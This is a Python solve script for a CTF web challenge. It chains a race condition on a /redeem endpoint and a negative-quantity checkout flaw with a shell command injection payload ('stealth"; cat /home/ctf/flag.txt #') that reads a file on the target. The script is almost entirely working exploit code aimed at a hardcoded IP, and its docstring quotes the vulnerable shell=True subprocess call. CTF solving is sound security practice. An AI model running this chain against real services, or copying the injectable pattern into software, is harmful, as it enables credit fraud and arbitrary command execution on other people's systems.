#!/usr/bin/env python3
"""
DefCamp CTF 2026 - defcamp-supply Solve Script
Vulnerabilities:
1. Race condition on /redeem allowing rapid balance escalation past 20 credits.
2. Business logic flaw in checkout ETA calculation where negative quantity (e.g. -30)
   causes ETA to drop below 0 immediately, marking order 'done' and triggering verify_custom_profile.
3. Command injection in verify_custom_profile via the `profile` parameter:
   subprocess.run(f'python3 verify_profile.py "{profile}"', shell=True)
   allows executing arbitrary commands and reading /home/ctf/flag.txt.
"""
import sys
import re
import requests
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "http://34.179.231.75:32379"

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Accept': 'application/json, text/plain, */*',
}

def solve(target_url=BASE_URL):
    s = requests.Session()
    s.headers.update(HEADERS)

    # Step 1: Initialize session
    print(f"[*] Connecting to {target_url}...")
    r = s.get(target_url)
    if r.status_code != 200:
        print(f"[-] Failed to load initial page: {r.status_code}")
        return None

    # Step 2: Race redeem requests
    print("[*] Racing redeem requests to bypass credit limit...")
    def do_redeem(_):
        try:
            return s.post(f"{target_url}/redeem", timeout=5)
        except Exception:
            return None

    with ThreadPoolExecutor(max_workers=16) as ex:
        results = list(ex.map(do_redeem, range(16)))

    successful = [res for res in results if res is not None and res.status_code == 200]
    print(f"[+] Successful redeem responses: {len(successful)}")

    # Step 3: Verify balance >= 20 credits
    r_main = s.get(target_url)
    m = re.search(r'¢(\d+)', r_main.text)
    balance = int(m.group(1)) if m else 0
    print(f"[+] Current account balance: ¢{balance}")
    if balance < 20:
        print("[-] Insufficient credits obtained from race; please retry.")
        return None

    # Step 4: Trigger instant order completion with negative quantity (-30) and command injection in profile
    cmd_injection = 'stealth"; cat /home/ctf/flag.txt #'
    print(f"[*] Purchasing zero_day_debugger with quantity=-30 and command injection payload...")
    r_checkout = s.post(f"{target_url}/checkout", data={
        'item_id': 'zero_day_debugger',
        'quantity': '-30',
        'profile': cmd_injection
    })

    if r_checkout.status_code != 200:
        print(f"[-] Checkout failed: {r_checkout.status_code} {r_checkout.text}")
        return None

    res_json = r_checkout.json()
    result_text = res_json.get('result', '')
    print(f"[+] Order result:\n{result_text}")

    flag_match = re.search(r'CTF\{[a-f0-9]{64}\}', result_text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"\n[!] FLAG: {flag}")
        return flag
    else:
        print("[-] Flag not found in result output.")
        return None

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else BASE_URL
    solve(url)
